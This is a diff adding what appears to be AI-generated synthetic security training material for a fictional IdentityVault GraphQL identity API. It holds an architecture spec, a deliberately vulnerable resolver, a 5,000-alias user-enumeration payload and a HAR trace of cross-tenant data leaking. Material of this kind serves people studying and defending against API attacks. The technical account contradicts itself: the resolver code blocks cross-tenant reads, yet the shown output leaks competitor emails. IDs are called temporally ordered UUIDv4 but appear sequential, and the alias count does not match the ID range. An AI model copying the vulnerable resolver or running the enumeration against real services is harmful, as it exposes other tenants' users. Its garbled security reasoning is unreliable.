@@ -1,0 +1,220 @@
+Here is the thirtieth system, continuing the focus on GraphQL-specific security failures. We are shifting into the **Enterprise API / Account Provisioning** sector, focusing on a **Customer Identity Management GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Alias Batching / Enumeration)** combined with **Pattern 2.2 (Metadata/attribute side-channel)**. This scenario demonstrates how GraphQL's flexibility is abused to enumerate thousands of competitor or high-value customer records, using the "soft fail" nature of the GraphQL resolver to perform a high-volume vertical data leak that bypasses conventional rate limiting.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** IdentityVault Enterprise Customer API
+**Document Version:** 5.0.0 (FINAL)
+**Classification:** CONFIDENTIAL / CORPORATE PII SCOPE
+**Domain:** Enterprise SaaS / Identity & Access Management (IAM) / Account Provisioning
+
+## 1.0 Executive Summary
+IdentityVault is a multi-tenant platform managing core customer data for enterprise clients. The API handles the CRUD operations for all user accounts, including account activation, password resets, and profile retrieval. It utilizes a centralized GraphQL endpoint to allow partner systems to fetch user details efficiently.
+
+The core security requirement is BOLA enforcement: A partner system should only be able to query users that belong to their specific organization (tenant). The API must prevent large-scale enumeration of users across the entire IdentityVault customer base.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture relies on a centralized GraphQL entry point for all data access.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway (Go-lang):** Enforces rate limiting (10 HTTP requests/second).
+* **GraphQL Resolver Engine (Node.js):** Uses a custom layer to dynamically construct database queries based on the requested fields.
+
+### 2.2 The Backend Core Services
+* **User Provisioning Service:** A Node.js microservice utilizing a PostgreSQL database where all user records reside.
+* **Authorization Middleware:** A custom resolver wrapper designed to check the `tenant_id` embedded in the token against the `tenant_id` of the requested user object.
+
+## 3.0 Identity, Sessions, and Object Authorization
+The security model relies on strict tenant-level isolation for user accounts.
+
+### 3.1 Partner Authentication (JWT)
+External partners authenticate via an API key exchange, receiving a JWT containing the `partner_tenant_id` and `partner_id`.
+
+### 3.2 The BOLA Enforcement Flaw
+When a user attempts to query a user account via `query user(id: ID)`, the resolver is supposed to perform a strict BOLA check. However, due to a bug in the authorization wrapper, if the BOLA check fails, the resolver returns an empty payload or `null` instead of a hard error (e.g., `403 Forbidden`). This "soft fail" allows an attacker to distinguish between a non-existent user ID and an unauthorized, existing user ID.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The underlying user ID scheme uses sequential UUIDs (UUIDv4 generation that is temporally ordered). The GraphQL resolver's soft fail behavior (Pattern 2.2) combined with the alias batching (Pattern 9.1) allows for massive, high-speed enumeration of the entire user database. Tracked as RISK-GRPH-904.*
+
+### 4.1 Vulnerability A: GraphQL Alias Batching for Customer Enumeration (BOLA)
+**Taxonomy Pattern:** 9.1 (GraphQL Operations / Batching) & 2.2 (Metadata/attribute side-channel)
+**Sub-system:** User Provisioning Service Resolver (`Query: user`)
+
+**The Deep Architectural Flaw:**
+This attack chains soft error handling with batching to achieve massive vertical data leakage.
+
+1. **Predictable or Guessable IDs:** The user IDs are UUIDs, but they contain enough sequential/predictable components (due to poor implementation) that an attacker can guess adjacent IDs belonging to other tenants.
+2. **Metadata Side-Channel (Pattern 2.2):** When the BOLA check fails, the GraphQL resolver returns `null` in the response payload. If the ID requested does not exist at all, the resolver returns a different, harder-to-parse error message, or simply responds faster. The ability to receive a structured `null` response for thousands of attempts allows the attacker to efficiently determine which UUIDs correspond to valid, existing user accounts belonging to other tenants (e.g., competitor employees).
+3. **GraphQL Alias Batching (Pattern 9.1):** The attacker uses GraphQL Aliases to request 5,000 sequentially-guessable user IDs in a single HTTP request. This single request bypasses the API Gateway's rate limit of 10 HTTP requests/second.
+
+**The Exploitation Path:**
+
+1. **The Foothold:** An attacker registers a partner API key (`Partner-A`).
+2. **The Enumeration Query:** The attacker crafts a single GraphQL query containing 5,000 aliases, targeting a range of guessable User IDs (e.g., from `usr-000000` to `usr-050000`), requesting a non-sensitive but confirming field (e.g., `email`, `tenantId`).
+3. **The Execution:** The single HTTP request is accepted. The GraphQL engine executes 5,000 internal queries. For unauthorized users, the resolver returns `null` or, for authorized users, returns the full object.
+4. **The Impact:** The attacker quickly collects a list of thousands of validated email addresses and tenant IDs belonging to other IdentityVault customers, leading to a massive customer enumeration and data breach.
+
+***
+
+# IDENTITYVAULT API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.0
+**Applies to Architecture:** IdentityVault Enterprise Customer API v5.0.0
+
+## 5.0 User Profiles Schema (PostgreSQL)
+The database structure relies on the `tenant_id` to enforce security, which the resolver fails to use effectively during BOLA checks.
+
+```sql
+-- Core User Profile Table
+CREATE TABLE user_profiles (
+user_id VARCHAR(50) PRIMARY KEY, -- Sequentially guessable UUID variant
+tenant_id VARCHAR(50) NOT NULL,    -- CRITICAL ISOLATION FIELD
+email VARCHAR(100) UNIQUE NOT NULL,
+first_name VARCHAR(50),
+last_name VARCHAR(50),
+is_active BOOLEAN DEFAULT TRUE,
+last_login TIMESTAMP WITH TIME ZONE
+);
+
+CREATE INDEX idx_user_tenant ON user_profiles(tenant_id);
+```
+
+## 6.0 The Flawed Implementation (Node.js / GraphQL Resolver)
+The resolver is configured to return `null` on authorization failure, enabling the side-channel enumeration attack.
+
+### 6.1 Vulnerable User Resolver
+```javascript
+// File: resolvers/userResolver.js
+const User = require('../models/User');
+
+const userResolvers = {
+Query: {
+user: async (parent, { id }, context) => {
+const authTenantId = context.partner.tenantId;
+  // 1. Look up the user in the database
+  const user = await User.findById(id);
+
+  if (!user) {
+    // Returns null for truly non-existent IDs
+    return null;
+  }
+
+  // VULNERABILITY 9.1 & 2.2: Soft Authorization Failure
+  // The BOLA check is performed, but the function returns 'null' on failure,
+  // which is distinguishable from a hard '403' or a generic GraphQL error, 
+  // allowing the attacker to map ID existence.
+  if (user.tenantId !== authTenantId) {
+    return null; // FLAW: Leaks existence metadata to the attacker
+  }
+
+  return user;
+}
+}
+};
+```
+
+## 7.0 GraphQL API Contract (The Enumeration Attack)
+The attacker uses GraphQL aliases to perform a massive, high-speed enumeration for existing user IDs.
+
+### 7.1 Execute Alias Enumeration
+**Endpoint:** `POST /graphql`
+**Description:** Attempts to enumerate user IDs 1 to 5000 in a single request.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Partner_A_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload (Truncated):**
+```graphql
+query MassUserEnumeration {
+u1: user(id: "usr-000001") { email tenantId }
+u2: user(id: "usr-000002") { email tenantId }
+# ... (4997 more user queries follow) ...
+u5000: user(id: "usr-050000") { email tenantId }
+}
+```
+
+**Success Response (200 OK - Data Leak):**
+The response is scanned for non-`null` entries, which confirm the existence of a competitor's user ID.
+```json
+{
+"data": {
+"u1": null,
+"u2": null,
+"u3": {
+"email": "cfo.smith@competitor-corp.com",
+"tenantId": "COMPETITOR_TENANT_001"
+},
+"u4": null,
+# ... (4995 more null/object entries follow) ...
+"u105": {
+"email": "hr.lead@other-enterprise.com",
+"tenantId": "ENTERPRISE_B_889"
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL ALIAS ENUMERATION & BOLA (HAR TRACE)
+**Applies to Architecture:** IdentityVault Enterprise Customer API v5.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 2.2)
+
+This HTTP Archive (HAR) trace captures the execution of the high-speed cross-tenant enumeration attack. The attacker submits a single HTTP POST request containing a GraphQL query with thousands of aliased fields (`u1`, `u2`, etc.), targeting a guessable range of User IDs.
+
+The single request successfully bypasses the HTTP-level rate limit. The GraphQL resolver engine executes all 5,000 sub-queries. Due to the soft authorization failure (`return null`), the response contains a mix of `null` entries (for non-existent or unauthorized-and-filtered users) and complete data objects (where BOLA failed or the user was authorized). The output, which includes `"cfo.smith@competitor-corp.com"` and `"ENTERPRISE_B_889"` exposes the enumeration vulnerability, allowing the attacker to efficiently harvest sensitive customer lists belonging to other tenants.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Go-lang API Gateway / Node.js Resolver Logs",
+"version": "5.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T12:25:40.050Z",
+"time": 712,
+"request": {
+"method": "POST",
+"url": "https://api.identityvault.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.identityvault.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZW5hbnRfaWQiOiJQQVJUTkVSX0EiLCJwYXJ0bmVyX2lkIjoicGFydG5lci0xMDEifQ..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query MassUserEnumeration { u1: user(id: \\\"usr-000001\\\") { email tenantId } u2: user(id: \\\"usr-000002\\\") { email tenantId } ... u5000: user(id: \\\"usr-050000\\\") { email tenantId } }\"}",
+"comment": "Payload containing 5,000 aliased fields. Actual bodySize was 200,000 bytes."
+},
+"bodySize": 200000
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-nodes-processed", "value": "5000" }
+],
+"content": {
+"size": 150000,
+"mimeType": "application/json",
+"text": "{\"data\": {\"u1\": null, \"u2\": null, \"u3\": {\"email\": \"cfo.smith@competitor-corp.com\", \"tenantId\": \"COMPETITOR_TENANT_001\"}, \"u4\": null, ... \"u105\": {\"email\": \"hr.lead@other-enterprise.com\", \"tenantId\": \"ENTERPRISE_B_889\"}, ... \"u5000\": null}}"
+},
+"bodySize": 150000
+}
+}
+]
+}
+}
+```
+
+***
